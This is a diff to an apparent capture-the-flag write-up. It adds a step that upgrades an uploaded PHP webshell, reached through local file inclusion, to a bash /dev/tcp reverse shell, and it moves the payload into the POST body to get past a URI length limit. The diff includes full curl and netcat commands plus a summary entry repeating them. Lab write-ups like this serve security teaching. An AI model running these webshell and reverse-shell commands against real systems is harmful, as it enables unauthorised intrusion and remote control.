@@ -226,6 +226,40 @@ easytohack@123
 
 ---
 
+## Level 6b — Upgrading to a Reverse Shell
+
+While the `cmd=` webshell (Level 6) and the leaked SSH credentials were both sufficient to reach the box, a reverse shell was set up as well for a more stable, interactive session (and as good practice for scenarios where SSH access isn't available).
+
+**Listener on the attacking machine:**
+```bash
+nc -nvlp 4444
+```
+
+**First attempt — payload in the URL query string — failed:**
+```bash
+curl -X POST "http://10.49.158.22:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png&cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.134.10/4444+0%3E%261%27" \
+  -d "password=easytohack"
+```
+This returned:
+```
+414 Request-URI Too Long
+```
+The encoded reverse shell one-liner pushed the query string length past the server's limit.
+
+**Fix — move the `cmd` parameter into the POST body instead of the URL**, since the webshell accepted it via `$_REQUEST` (both GET and POST):
+```bash
+curl -X POST "http://10.49.158.22:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png" \
+  --data-urlencode "password=easytohack" \
+  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.134.10/4444 0>&1'"
+```
+This kept the URL short (only the `file` parameter remains in the query string) while letting `curl --data-urlencode` handle safe encoding of the much longer reverse shell payload in the request body.
+
+**Result:** Reverse shell connected successfully to the `nc` listener, giving an interactive shell as the web server user — a more usable foothold than repeated one-off `cmd=` requests, and set up before privilege escalation to `zeamkish`/root.
+
+**Lesson:** Long payloads (especially reverse shell one-liners with heavy URL-encoding) can exceed a web server's default URI length limit (Apache's default is typically 8KB, but some configs are much stricter) when placed in the query string. Moving the same parameter into the POST body sidesteps this entirely, since body size limits are generally far more generous than URL length limits — a good default habit for any sizeable payload delivered through a vulnerable parameter.
+
+---
+
 ## Level 7 — Privilege Escalation via SUID `find`
 
 SSH'd in with the leaked credentials:
@@ -291,6 +325,12 @@ curl -X POST "http://10.49.176.101:1337/file1010111/index.php?file=php://filter/
 curl -X POST "http://10.49.176.101:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png&cmd=cat+/home/zeamkish/ssh_creds.txt" \
   -d "password=easytohack"
 
+# Level 6b — Reverse shell (payload moved to POST body to avoid 414 URI Too Long)
+nc -nvlp 4444
+curl -X POST "http://10.49.176.101:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/webshell.png" \
+  --data-urlencode "password=easytohack" \
+  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+
 # Level 7 — Privilege escalation
 ssh zeamkish@10.49.176.101   # easytohack@123
 find / -type f -perm -u=s -ls 2>/dev/null
@@ -308,8 +348,9 @@ cat /root/root.txt
 4. **LFI against `.php` files needs a filter wrapper to be useful.** Without `php://filter/convert.base64-encode`, PHP source is executed rather than disclosed, hiding the full extent of what an LFI can reveal.
 5. **Client-side file validation is not validation.** The upload form's JavaScript extension check was trivially bypassed with a raw HTTP request — server-side validation (MIME type, magic bytes, re-encoding) is the only validation that counts.
 6. **LFI + unrestricted upload = RCE.** Neither vulnerability alone was catastrophic; combined, they allowed arbitrary PHP execution.
-7. **Plaintext credential files on disk are still a common real-world finding.** `ssh_creds.txt` sitting readable via a webshell is exactly the kind of "quick win" file real attackers search for after gaining any code execution.
-8. **Always audit SUID binaries after gaining a foothold.** A SUID `find` is one of the most well-documented privilege escalation vectors in Linux — checking against GTFOBins should be a reflexive step after any low-privilege shell.
+7. **Long payloads belong in the request body, not the URL.** A reverse shell one-liner triggered a `414 Request-URI Too Long` when passed as a GET query parameter; moving the same parameter into the POST body resolved it immediately, since body size limits are far more permissive than URL length limits.
+8. **Plaintext credential files on disk are still a common real-world finding.** `ssh_creds.txt` sitting readable via a webshell is exactly the kind of "quick win" file real attackers search for after gaining any code execution.
+9. **Always audit SUID binaries after gaining a foothold.** A SUID `find` is one of the most well-documented privilege escalation vectors in Linux — checking against GTFOBins should be a reflexive step after any low-privilege shell.
 
 ## Defensive Recommendations
 
